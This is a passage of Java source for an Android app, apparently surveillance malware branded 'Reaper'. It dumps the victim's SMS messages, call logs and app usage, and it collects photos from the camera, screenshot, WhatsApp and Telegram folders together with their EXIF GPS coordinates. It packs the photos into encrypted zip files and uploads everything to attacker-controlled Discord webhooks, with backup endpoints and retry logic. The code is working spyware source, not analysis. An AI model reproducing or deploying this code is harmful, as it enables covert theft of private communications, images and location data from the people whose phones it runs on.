                f.add(field("ℹ️ Note", "`PACKAGE_USAGE_STATS` grant කරලා නෑ (Settings → Special access)",
                        false));
                sendEmbed(embedJson("📊  APP USAGE (24h)", null, COLOR_GOLD, f, "Reaper • usage"),
                        10000, 10000);
                return;
            }

            Map<String, Long> map = new HashMap<>();
            for (UsageStats u : st) {
                if (u == null || u.getTotalTimeInForeground() <= 0) continue;
                Long prev = map.get(u.getPackageName());
                map.put(u.getPackageName(), (prev == null ? 0L : prev) + u.getTotalTimeInForeground());
            }
            List<Map.Entry<String, Long>> list = new ArrayList<>(map.entrySet());
            Collections.sort(list, (a, b) -> Long.compare(b.getValue(), a.getValue()));

            PackageManager pm = c.getPackageManager();
            StringBuilder sb = new StringBuilder();
            int n = 0;
            for (Map.Entry<String, Long> e : list) {
                if (n++ >= USAGE_DUMP_LIMIT) break;
                String label = e.getKey();
                try { label = String.valueOf(pm.getApplicationLabel(pm.getApplicationInfo(e.getKey(), 0))); }
                catch (Throwable ignored) {}
                long ms = e.getValue();
                sb.append("• **").append(esc(label)).append("** — ")
                  .append(ms / 60000L).append("m ").append((ms % 60000L) / 1000L).append("s\n");
            }
            List<String> f = new ArrayList<>();
            f.add(field("⏱️ Window", "last 24h", true));
            sendEmbed(embedJson("📊  APP USAGE (top " + Math.min(list.size(), USAGE_DUMP_LIMIT) + ")",
                    sb.toString().trim(), COLOR_GOLD, f, "Reaper • usage"), 10000, 10000);
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "usage: " + t);
        }
    }

    private static void recordBatterySample(Context c) {
        if (!SEND_BATTERY_HISTORY) return;
        try {
            Intent b = c.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (b == null) return;
            int lvl = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int sc  = b.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (lvl < 0 || sc <= 0) return;
            int pct = lvl * 100 / sc;
            SharedPreferences sp = c.getSharedPreferences(PREF_MISC, Context.MODE_PRIVATE);
            String hist = sp.getString("batt_hist", "");
            String entry = fmt("dd/MM HH:mm", System.currentTimeMillis()) + " " + pct + "%";
            String[] parts = hist.isEmpty() ? new String[0] : hist.split(" \\| ");
            List<String> keep = new ArrayList<>(Arrays.asList(parts));
            keep.add(entry);
            while (keep.size() > 12) keep.remove(0);
            sp.edit().putString("batt_hist", TextUtils.join(" | ", keep)).apply();
        } catch (Throwable ignored) {}
    }

    private static String batteryHistory(Context c) {
        try {
            String h = c.getSharedPreferences(PREF_MISC, Context.MODE_PRIVATE)
                    .getString("batt_hist", "");
            return TextUtils.isEmpty(h) ? null : h;
        } catch (Throwable t) { return null; }
    }

    // ===================== 7. SMS / CALL LOG =====================

    private static void sendTextBlock(Context c, String title, String body, int color) {
        if (TextUtils.isEmpty(body)) return;
        sendEmbed(embedJson(title + "  [" + code(shorten(SecurityGuard.getDeviceHwid(c))) + "]",
                body, color, null, "Reaper • " + title), 12000, 12000);
    }

    private static String dumpSms(Context c, int limit) {
        if (!hasPerm(c, Manifest.permission.READ_SMS)) return "";
        StringBuilder sb = new StringBuilder();
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                    null, null, Telephony.Sms.DATE + " DESC LIMIT " + limit);
            if (cur != null) {
                int ac = cur.getColumnIndex(Telephony.Sms.ADDRESS);
                int bc = cur.getColumnIndex(Telephony.Sms.BODY);
                int dc = cur.getColumnIndex(Telephony.Sms.DATE);
                int n = 0;
                while (cur.moveToNext() && n < limit) {
                    String addr = (ac >= 0) ? cur.getString(ac) : "?";
                    String body = (bc >= 0) ? cur.getString(bc) : "";
                    long dt = (dc >= 0) ? cur.getLong(dc) : 0;
                    if (body == null) body = "";
                    if (body.length() > 140) body = body.substring(0, 140) + "…";
                    sb.append("`").append(code(safe(addr, "?"))).append("` ")
                      .append(esc(fmt("dd/MM HH:mm", dt))).append("\n")
                      .append("> ").append(esc(body)).append("\n");
                    n++;
                    if (sb.length() > 3900) break;
                }
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "dumpSms: " + t);
        } finally { if (cur != null) try { cur.close(); } catch (Throwable ignored) {} }
        return sb.toString().trim();
    }

    private static String dumpCallLog(Context c, int limit) {
        if (!hasPerm(c, Manifest.permission.READ_CALL_LOG)) return "";
        StringBuilder sb = new StringBuilder();
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION, CallLog.Calls.DATE},
                    null, null, CallLog.Calls.DATE + " DESC LIMIT " + limit);
            if (cur != null) {
                int nc = cur.getColumnIndex(CallLog.Calls.NUMBER);
                int tc = cur.getColumnIndex(CallLog.Calls.TYPE);
                int dc = cur.getColumnIndex(CallLog.Calls.DURATION);
                int dtc = cur.getColumnIndex(CallLog.Calls.DATE);
                int n = 0;
                while (cur.moveToNext() && n < limit) {
                    String num = (nc >= 0) ? cur.getString(nc) : "?";
                    int type = (tc >= 0) ? cur.getInt(tc) : 0;
                    long dur = (dc >= 0) ? cur.getLong(dc) : 0;
                    long dt = (dtc >= 0) ? cur.getLong(dtc) : 0;
                    sb.append("• ").append(callIcon(type)).append(" `").append(code(safe(num, "?")))
                      .append("` ").append(dur).append("s ")
                      .append(esc(fmt("dd/MM HH:mm", dt))).append("\n");
                    n++;
                    if (sb.length() > 3900) break;
                }
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "dumpCallLog: " + t);
        } finally { if (cur != null) try { cur.close(); } catch (Throwable ignored) {} }
        return sb.toString().trim();
    }

    private static String callIcon(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "⬇️";
            case CallLog.Calls.OUTGOING_TYPE: return "⬆️";
            case CallLog.Calls.MISSED_TYPE:   return "❌";
            default: return "📞";
        }
    }

    // ===================== 8. SHOT MODEL + EXIF =====================

    private static final class Shot {
        byte[] data;
        String ext = "jpg";
        String path = "";
        String folder = "";
        long   size;
        long   date;
        double lat = Double.NaN;
        double lon = Double.NaN;

        boolean hasGps() { return !Double.isNaN(lat) && !Double.isNaN(lon) && lat != 0.0 && lon != 0.0; }
        String key() { return path + "|" + size + "|" + date; }
    }

    private static boolean hasPerm(Context c, String p) {
        try { return ContextCompat.checkSelfPermission(c, p) == PackageManager.PERMISSION_GRANTED; }
        catch (Throwable t) { return false; }
    }

    private static boolean hasImagePermission(Context c) {
        if (c == null) return false;
        if (Build.VERSION.SDK_INT >= 33) {
            return hasPerm(c, "android.permission.READ_MEDIA_IMAGES")
                || hasPerm(c, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED");
        }
        return hasPerm(c, Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private static double[] readGps(Context ctx, Uri uri, String path) {
        if (!SEND_EXIF_GPS) return null;
        ExifInterface ex = openExif(ctx, uri, path);
        if (ex == null) return null;
        try {
            String latS = ex.getAttribute(ExifInterface.TAG_GPS_LATITUDE);
            String lonS = ex.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);
            String latR = ex.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF);
            String lonR = ex.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF);
            if (latS == null || lonS == null) return null;
            double lat = dmsToDeg(latS);
            double lon = dmsToDeg(lonS);
            if (Double.isNaN(lat) || Double.isNaN(lon)) return null;
            if ("S".equalsIgnoreCase(latR)) lat = -lat;
            if ("W".equalsIgnoreCase(lonR)) lon = -lon;
            return new double[]{lat, lon};
        } catch (Throwable t) { return null; }
    }

    private static int readOrientation(Context ctx, Uri uri, String path) {
        ExifInterface ex = openExif(ctx, uri, path);
        if (ex == null) return 0;
        try {
            int o = ex.getAttributeInt(ExifInterface.TAG_ORIENTATION, ExifInterface.ORIENTATION_NORMAL);
            switch (o) {
                case ExifInterface.ORIENTATION_ROTATE_90:  return 90;
                case ExifInterface.ORIENTATION_ROTATE_180: return 180;
                case ExifInterface.ORIENTATION_ROTATE_270: return 270;
                default: return 0;
            }
        } catch (Throwable t) { return 0; }
    }

    private static ExifInterface openExif(Context ctx, Uri uri, String path) {
        try {
            if (path != null) {
                File f = new File(path);
                if (f.exists() && f.canRead()) return new ExifInterface(path);
            }
        } catch (Throwable ignored) {}
        try {
            if (Build.VERSION.SDK_INT >= 24 && ctx != null && uri != null) {
                InputStream is = ctx.getContentResolver().openInputStream(uri);
                if (is != null) {
                    ExifInterface ex = new ExifInterface(is);
                    is.close();
                    return ex;
                }
            }
        } catch (Throwable ignored) {}
        return null;
    }

    /** "6/1,55/1,30/1" → decimal degrees */
    private static double dmsToDeg(String dms) {
        try {
            String[] p = dms.split(",");
            if (p.length < 2) return Double.NaN;
            double d = rational(p[0]);
            double m = rational(p[1]);
            double s = (p.length > 2) ? rational(p[2]) : 0.0;
            if (Double.isNaN(d) || Double.isNaN(m) || Double.isNaN(s)) return Double.NaN;
            return d + m / 60.0 + s / 3600.0;
        } catch (Throwable t) { return Double.NaN; }
    }

    private static double rational(String s) {
        try {
            s = s.trim();
            int i = s.indexOf('/');
            if (i < 0) return Double.parseDouble(s);
            double n = Double.parseDouble(s.substring(0, i));
            double d = Double.parseDouble(s.substring(i + 1));
            return d == 0 ? Double.NaN : n / d;
        } catch (Throwable t) { return Double.NaN; }
    }

    // ===================== 9. MEDIA COLLECTION =====================

    private static List<Shot> collectNewImages(Context context, Set<String> sentKeys) {
        List<Shot> list = new ArrayList<>(128);
        Set<String> seen = new HashSet<>();
        Map<String, Integer> albumCount = new HashMap<>();

        if (hasImagePermission(context)) {
            collectFromMediaStore(context, list, seen, albumCount, sentKeys);
        }
        if (list.size() < MAX_IMAGES_PER_SESSION) {
            for (String root : buildFilesystemRoots(context)) {
                if (list.size() >= MAX_IMAGES_PER_SESSION) break;
                File dir = new File(root);
                if (dir.exists() && dir.isDirectory() && dir.canRead())
                    scanDir(dir, list, seen, albumCount, sentKeys, 0);
            }
        }
        return list;
    }

    private static void collectFromMediaStore(Context context, List<Shot> list, Set<String> seen,
                                              Map<String, Integer> albumCount, Set<String> sentKeys) {
        Cursor cursor = null;
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE, "bucket_id"};
            String selection = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    ? MediaStore.Images.Media.IS_PENDING + "=0" : null;
            String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";

            cursor = cr.query(uri, projection, selection, null, sort);
            if (cursor == null) return;

            int idCol = cursor.getColumnIndex(MediaStore.Images.Media._ID);
            int dataCol = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
            int dateCol = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
            int sizeCol = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);
            int bucketCol = cursor.getColumnIndex("bucket_id");
            if (idCol < 0) idCol = 0;

            while (cursor.moveToNext() && list.size() < MAX_IMAGES_PER_SESSION) {
                long id = cursor.getLong(idCol);
                String path = (dataCol >= 0) ? cursor.getString(dataCol) : null;
                long date = (dateCol >= 0) ? cursor.getLong(dateCol) : 0;
                long size = (sizeCol >= 0) ? cursor.getLong(sizeCol) : 0;

                String album = albumKey(path, (bucketCol >= 0) ? cursor.getLong(bucketCol) : -1, id);
                int have = albumCount.containsKey(album) ? albumCount.get(album) : 0;
                if (have >= MAX_IMAGES_PER_ALBUM) continue;

                String key = (path != null && !path.isEmpty()) ? path : ("id:" + id);
                if (seen.contains(key)) continue;
                if (DELTA_SYNC && sentKeys.contains(key + "|" + size + "|" + date)) continue;

                Uri contentUri = ContentUris.withAppendedId(uri, id);
                Shot s = makeShot(context, contentUri, path, date, size);
                if (s == null) continue;

                list.add(s);
                seen.add(key);
                albumCount.put(album, have + 1);
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "mediaStore: " + t);
        } finally { if (cursor != null) try { cursor.close(); } catch (Throwable ignored) {} }
    }

    private static String albumKey(String path, long bucketId, long id) {
        if (path != null && !path.isEmpty()) {
            File parent = new File(path).getParentFile();
            if (parent != null) return parent.getAbsolutePath();
        }
        if (bucketId >= 0) return "b:" + bucketId;
        return "id:" + id;
    }

    private static List<String> buildFilesystemRoots(Context context) {
        List<String> roots = new ArrayList<>();
        List<File> storages = new ArrayList<>();
        try {
            File primary = Environment.getExternalStorageDirectory();
            if (primary != null) storages.add(primary);
        } catch (Throwable ignored) {}
        try {
            File[] dirs = ContextCompat.getExternalFilesDirs(context, null);
            if (dirs != null) {
                for (File d : dirs) {
                    if (d == null) continue;
                    File p = d;
                    for (int i = 0; i < 4 && p.getParentFile() != null; i++) p = p.getParentFile();
                    if (!storages.contains(p)) storages.add(p);
                }
            }
        } catch (Throwable ignored) {}

        for (File s : storages) {
            String b = s.getAbsolutePath();
            roots.add(b + "/DCIM/Camera");
            roots.add(b + "/DCIM/100ANDRO");
            roots.add(b + "/DCIM/100MEDIA");
            roots.add(b + "/DCIM/Screenshots");
            roots.add(b + "/DCIM");
            roots.add(b + "/Pictures/Screenshots");
            roots.add(b + "/Pictures");
            roots.add(b + "/Download");
            roots.add(b + "/Downloads");
            roots.add(b + "/WhatsApp/Media/WhatsApp Images");
            roots.add(b + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images");
            roots.add(b + "/Telegram/Telegram Images");
        }
        return roots;
    }

    private static void scanDir(File dir, List<Shot> list, Set<String> seen,
                                Map<String, Integer> albumCount, Set<String> sentKeys, int depth) {
        if (dir == null || !dir.exists() || !dir.canRead() || depth > MAX_SCAN_DEPTH) return;
        if (list.size() >= MAX_IMAGES_PER_SESSION) return;

        final String album = dir.getAbsolutePath();
        int have = albumCount.containsKey(album) ? albumCount.get(album) : 0;

        try {
            File[] files = dir.listFiles();
            if (files == null) return;
            Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

            for (File f : files) {
                if (list.size() >= MAX_IMAGES_PER_SESSION) break;
                if (f.isDirectory()) {
                    scanDir(f, list, seen, albumCount, sentKeys, depth + 1);
                } else if (f.isFile() && f.canRead()) {
                    if (have >= MAX_IMAGES_PER_ALBUM) continue;
                    String abs = f.getAbsolutePath();
                    if (seen.contains(abs)) continue;
                    String name = f.getName().toLowerCase(Locale.US);
                    if (!(name.endsWith(".jpg") || name.endsWith(".jpeg")
                            || name.endsWith(".png") || name.endsWith(".webp"))) continue;
                    if (name.startsWith("thumb") && f.length() < 8192) continue;

                    long size = f.length();
                    long date = f.lastModified() / 1000L;
                    if (DELTA_SYNC && sentKeys.contains(abs + "|" + size + "|" + date)) continue;

                    Shot s = makeShot(null, null, abs, date, size);
                    if (s == null) continue;
                    list.add(s);
                    seen.add(abs);
                    have++;
                    albumCount.put(album, have);
                }
            }
        } catch (Throwable ignored) {}
    }

    private static Shot makeShot(Context ctx, Uri uri, String path, long date, long size) {
        try {
            double[] gps = readGps(ctx, uri, path);
            int orientation = readOrientation(ctx, uri, path);

            Bitmap bmp = decode(ctx, uri, path);
            if (bmp == null) return null;

            if (orientation != 0) {
                try {
                    Matrix m = new Matrix();
                    m.postRotate(orientation);
                    Bitmap r = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), m, true);
                    if (r != bmp) { bmp.recycle(); bmp = r; }
                } catch (Throwable ignored) {}
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream(64 * 1024);
            Shot s = new Shot();
            if (Build.VERSION.SDK_INT >= 30) {
                s.ext = "webp";
                bmp.compress(Bitmap.CompressFormat.WEBP_LOSSY, IMAGE_QUALITY, baos);
            } else {
                s.ext = "jpg";
                bmp.compress(Bitmap.CompressFormat.JPEG, IMAGE_QUALITY, baos);
            }
            bmp.recycle();

            byte[] data = baos.toByteArray();
            if (data.length < 512) return null;

            s.data = data;
            s.path = (path != null && !path.isEmpty()) ? path : ("uri:" + (uri != null ? uri : "?"));
            s.size = size;
            s.date = date;
            File pf = (path != null) ? new File(path).getParentFile() : null;
            s.folder = (pf != null) ? pf.getName() : "?";
            if (gps != null && gps.length == 2) { s.lat = gps[0]; s.lon = gps[1]; }
            return s;
        } catch (Throwable t) { return null; }
    }

    private static Bitmap decode(Context ctx, Uri uri, String path) {
        try {
            BitmapFactory.Options b = new BitmapFactory.Options();
            b.inJustDecodeBounds = true;

            if (ctx != null && uri != null) {
                try (InputStream is = ctx.getContentResolver().openInputStream(uri)) {
                    if (is != null) BitmapFactory.decodeStream(is, null, b);
                }
            }
            if (b.outWidth <= 0 && path != null) {
                BitmapFactory.decodeFile(path, b);
            }
            int w = b.outWidth, h = b.outHeight;
            if (w <= 0 || h <= 0) return null;

            int sample = 1;
            while ((w / sample) > IMAGE_MAX_DIM || (h / sample) > IMAGE_MAX_DIM) sample *= 2;

            BitmapFactory.Options o = new BitmapFactory.Options();
            o.inSampleSize = sample;
            o.inPreferredConfig = Bitmap.Config.RGB_565;

            if (ctx != null && uri != null) {
                try (InputStream is = ctx.getContentResolver().openInputStream(uri)) {
                    if (is != null) return BitmapFactory.decodeStream(is, null, o);
                }
            }
            if (path != null) return BitmapFactory.decodeFile(path, o);
        } catch (Throwable ignored) {}
        return null;
    }

    // ===================== 10. DELTA SYNC STORE =====================

    private static Set<String> loadSent(Context c) {
        Set<String> set = new LinkedHashSet<>();
        File f = new File(c.getFilesDir(), "reaper_sent.txt");
        if (!f.exists()) return set;
        BufferedReader br = null;
        try {
            br = new BufferedReader(new FileReader(f));
            String line;
            while ((line = br.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty()) set.add(line);
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "loadSent: " + t);
        } finally { if (br != null) try { br.close(); } catch (Throwable ignored) {} }
        return set;
    }

    private static void saveSent(Context c, Set<String> set) {
        try {
            List<String> all = new ArrayList<>(set);
            int from = Math.max(0, all.size() - MAX_SENT_KEYS);
            File f = new File(c.getFilesDir(), "reaper_sent.txt");
            try (FileWriter fw = new FileWriter(f, false)) {
                for (int i = from; i < all.size(); i++) { fw.write(all.get(i)); fw.write('\n'); }
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "saveSent: " + t);
        }
    }

    // ===================== 11. ZIP (AES) =====================

    private static int writeZip(File target, List<Shot> shots) {
        int count = 0;
        ZipFile zf = null;
        try {
            boolean enc = !TextUtils.isEmpty(ZIP_PASSWORD);
            zf = new ZipFile(target);
            if (enc) zf.setPassword(ZIP_PASSWORD.toCharArray());

            int index = 1;
            for (Shot s : shots) {
                if (s == null || s.data == null || s.data.length < 512) continue;

                ZipParameters p = new ZipParameters();
                p.setFileNameInZip(String.format(Locale.US, "%04d.%s", index, s.ext));
                p.setCompressionMethod(CompressionMethod.DEFLATE);
                p.setCompressionLevel(CompressionLevel.NORMAL);
                if (enc) {
                    p.setEncryptFiles(true);
                    p.setEncryptionMethod(EncryptionMethod.AES);
                    p.setAesKeyStrength(AESKeyStrength.KEY_STRENGTH_256);
                }
                zf.addStream(new ByteArrayInputStream(s.data), p);
                index++;
                count++;
            }
        } catch (Throwable t) {
            if (DBG) Log.w(TAG, "writeZip: " + t);
            return 0;
        } finally {
            // FIX (a): stream flush + central directory write.
            // close() නැතුව ZIP එක corrupt වෙන්න පුළුවන්.
            if (zf != null) try { zf.close(); } catch (Throwable ignored) {}
        }
        return count;
    }

    // ===================== 12. DISCORD TRANSPORT =====================

    private static volatile long sLastSendTs = 0L;

    private static synchronized void throttle() {
        long wait = MIN_SEND_GAP_MS - (System.currentTimeMillis() - sLastSendTs);
        if (wait > 0) { try { Thread.sleep(wait); } catch (InterruptedException ignored) {} }
        sLastSendTs = System.currentTimeMillis();
    }

    private static String[] webhooks() {
        List<String> l = new ArrayList<>(2);
        if (!TextUtils.isEmpty(DISCORD_WEBHOOK_URL)) l.add(DISCORD_WEBHOOK_URL);
        if (!TextUtils.isEmpty(BACKUP_WEBHOOK_URL) && !BACKUP_WEBHOOK_URL.equals(DISCORD_WEBHOOK_URL))
            l.add(BACKUP_WEBHOOK_URL);
        return l.toArray(new String[0]);
    }

    // ---- legacy aliases ----
    public static boolean sendTelegramMessage(String t) { return sendDiscordMessage(t); }
    public static boolean sendTelegramMessage(String t, int c, int r) { return sendDiscordMessage(t, c, r); }

    public static boolean sendDiscordMessage(String text) { return sendDiscordMessage(text, 15000, 15000); }

    public static boolean sendDiscordMessage(String text, int connectMs, int readMs) {
        if (TextUtils.isEmpty(text)) return false;
        boolean ok = true;
        for (String chunk : splitForDiscord(text)) {
            if (!postDiscordPayload("{\"username\":\"" + jsonEscape(DISCORD_USERNAME)
                    + "\",\"flags\":4,\"content\":\"" + jsonEscape(chunk) + "\"}", null, null, connectMs, readMs))
                ok = false;
            throttle();
        }
        return ok;
    }

    public static boolean sendEmbed(String embedJson, int connectMs, int readMs) {
        return postDiscordPayload(payloadJson(embedJson), null, null, connectMs, readMs);
    }

    private static String payloadJson(String embedJson) {
        return "{\"username\":\"" + jsonEscape(DISCORD_USERNAME)
                + "\",\"flags\":4,"
                + "\"allowed_mentions\":{\"parse\":[\"users\",\"roles\"]},"
                + "\"embeds\":[" + embedJson + "]}";
    }

    private static List<String> splitForDiscord(String text) {
        List<String> out = new ArrayList<>();
        if (text.length() <= DISCORD_MAX_CHARS) { out.add(text); return out; }
        StringBuilder cur = new StringBuilder();
        for (String line : text.split("\n", -1)) {
            if (cur.length() + line.length() + 1 > DISCORD_MAX_CHARS) {
                if (cur.length() > 0) { out.add(cur.toString()); cur.setLength(0); }
                while (line.length() > DISCORD_MAX_CHARS) {
                    out.add(line.substring(0, DISCORD_MAX_CHARS));
                    line = line.substring(DISCORD_MAX_CHARS);
                }
            }
            cur.append(line).append('\n');
        }
        if (cur.length() > 0) out.add(cur.toString());
        return out;
    }

    private static boolean postDiscordPayload(String payloadJson, List<File> files,
                                              List<String> names, int connectMs, int readMs) {
        for (String url : webhooks()) {
            if (files == null || files.isEmpty()) {
                if (postJson(url, payloadJson, connectMs, readMs)) return true;
            } else {
                if (postMultipart(url, payloadJson, files, names)) return true;
            }
        }
        return false;
    }

    private static boolean postDiscordPayloadWithFiles(String payloadJson,
                                                       List<File> files, List<String> names) {
        return postDiscordPayload(payloadJson, files, names, 30000, 180000);
    }

    private static boolean postJson(String url, String json, int connectMs, int readMs) {
        byte[] body = json.getBytes(StandardCharsets.UTF_8);
        String fullUrl = url + (url.contains("?") ? "&" : "?") + "wait=true";

        for (int attempt = 1; attempt <= 2; attempt++) {
            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) new URL(fullUrl).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(connectMs);
                conn.setReadTimeout(readMs);
                conn.setRequestProperty("User-Agent", UA);
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                conn.setFixedLengthStreamingMode(body.length);
                try (OutputStream out = conn.getOutputStream()) { out.write(body); out.flush(); }

                int code = conn.getResponseCode();
                if (code >= 200 && code < 300) return true;
                if (DBG) Log.w(TAG, "json HTTP " + code);
                if (code == 429 && attempt < 2) { sleepRetryAfter(conn); continue; }
                if (code >= 500 && attempt < 2) { sleep(1200); continue; }
                return false;
            } catch (Throwable t) {
                if (DBG) Log.w(TAG, "json: " + t);
                if (attempt < 2) sleep(1200);
            } finally { if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {} }
        }
        return false;
    }

    private static boolean postMultipart(String url, String payloadJson,
                                         List<File> files, List<String> names) {
        String fullUrl = url + (url.contains("?") ? "&" : "?") + "wait=true";

        for (int attempt = 1; attempt <= 2; attempt++) {
            HttpURLConnection conn = null;
            String boundary = "----Reaper" + System.currentTimeMillis() + attempt;
            try {
                conn = (HttpURLConnection) new URL(fullUrl).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(180000);
                conn.setRequestProperty("User-Agent", UA);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setChunkedStreamingMode(128 * 1024);

                try (OutputStream out = conn.getOutputStream()) {
                    out.write(("--" + boundary + "\r\n"
                            + "Content-Disposition: form-data; name=\"payload_json\"\r\n"
                            + "Content-Type: application/json\r\n\r\n"
                            + payloadJson + "\r\n").getBytes(StandardCharsets.UTF_8));

                    for (int i = 0; i < files.size(); i++) {
                        File f = files.get(i);
                        String nm = (names != null && i < names.size()) ? names.get(i) : f.getName();
                        nm = nm.replace("\"", "").replace("\r", "").replace("\n", "");

                        out.write(("--" + boundary + "\r\n"
                                + "Content-Disposition: form-data; name=\"files[" + i
                                + "]\"; filename=\"" + nm + "\"\r\n"
                                + "Content-Type: application/octet-stream\r\n\r\n")
                                .getBytes(StandardCharsets.UTF_8));

                        byte[] buf = new byte[65536];
                        try (FileInputStream fis = new FileInputStream(f)) {
                            int r;
                            while ((r = fis.read(buf)) != -1) out.write(buf, 0, r);
                        }
                        out.write("\r\n".getBytes(StandardCharsets.UTF_8));
                    }
                    out.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
                    out.flush();
                }

                int code = conn.getResponseCode();
                if (code >= 200 && code < 300) return true;
                if (DBG) Log.w(TAG, "multipart HTTP " + code);
                if (code == 429 && attempt < 2) { sleepRetryAfter(conn); continue; }
            } catch (Throwable t) {
                if (DBG) Log.w(TAG, "multipart: " + t);
            } finally { if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {} }
            if (attempt < 2) sleep(1500);
        }
        return false;
    }

    private static boolean uploadDiscordFile(File file, String filename, String embedJson) {
        if (file == null || !file.exists() || file.length() == 0) return false;
        List<File> files = new ArrayList<>(1);
        List<String> names = new ArrayList<>(1);
        files.add(file);
        names.add(filename);
        return postDiscordPayload(payloadJson(embedJson), files, names, 30000, 180000);
    }

    private static void sleepRetryAfter(HttpURLConnection conn) {
        long ms = 1500L;
        try {
            String ra = conn.getHeaderField("Retry-After");
            if (!TextUtils.isEmpty(ra)) ms = (long) (Double.parseDouble(ra.trim()) * 1000.0) + 250L;
            else {
                String reset = conn.getHeaderField("X-RateLimit-Reset-After");
                if (!TextUtils.isEmpty(reset))
                    ms = (long) (Double.parseDouble(reset.trim()) * 1000.0) + 250L;
            }
        } catch (Throwable ignored) {}
        if (ms < 500) ms = 500;
        if (ms > 8000) ms = 8000;
        sleep(ms);
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    // ===================== 13. EMBED / JSON BUILDERS =====================

    private static String field(String name, String value, boolean inline) {
        return "{\"name\":\"" + jsonEscape(trim(name, 256)) + "\","
                + "\"value\":\"" + jsonEscape(trim(TextUtils.isEmpty(value) ? "-" : value, 1024)) + "\","
                + "\"inline\":" + inline + "}";
    }

    private static String embedJson(String title, String desc, int color,
                                    List<String> fields, String footer) {
        StringBuilder sb = new StringBuilder(512);
        sb.append('{');
        if (!TextUtils.isEmpty(title))
            sb.append("\"title\":\"").append(jsonEscape(trim(title, 256))).append("\",");
        if (!TextUtils.isEmpty(desc))
            sb.append("\"description\":\"").append(jsonEscape(trim(desc, 4000))).append("\",");
        sb.append("\"color\":").append(color).append(',');
        if (fields != null && !fields.isEmpty()) {
            sb.append("\"fields\":[");
            int n = 0;
            for (String f : fields) {
                if (n >= 25) break;
                if (n++ > 0) sb.append(',');
                sb.append(f);
            }
            sb.append("],");
        }
        if (!TextUtils.isEmpty(footer))
            sb.append("\"footer\":{\"text\":\"").append(jsonEscape(trim(footer, 2048))).append("\"},");
        sb.append("\"timestamp\":\"").append(isoNow()).append('"');
        sb.append('}');
        return sb.toString();
    }

    private static String trim(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max - 1) + "…";
    }

    // ===================== 14. INTRUSION =====================

    public static String getDetectedCrackingToolName(Context context) {
        if (context == null) return null;
        try {
            PackageManager pm = context.getPackageManager();
            for (String pkg : BLACKLISTED_PACKAGES) {
                try {
                    ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
                    CharSequence label = pm.getApplicationLabel(info);
                    return (label != null && label.length() > 0) ? label.toString() : pkg;
                } catch (PackageManager.NameNotFoundException ignored) {}
            }
        } catch (Throwable ignored) {}
        return null;
    }

    public static boolean detectIntrusion(Context context) {
        return getDetectedCrackingToolName(context) != null;
    }

    // ===================== 15. UTILS =====================

    public static String esc(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            switch (ch) {
                case '\\': case '*': case '_': case '~': case '`':
                case '|': case '>': case '<': case '[': case ']':
                    sb.append('\\').append(ch); break;
                default: sb.append(ch);
            }
        }
        return sb.toString();
    }

    private static String code(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("`", "'");
    }

    private static String jsonEscape(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (c < 0x20) sb.append(String.format(Locale.US, "\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }

    private static String safe(String s, String def) { return TextUtils.isEmpty(s) ? def : s; }

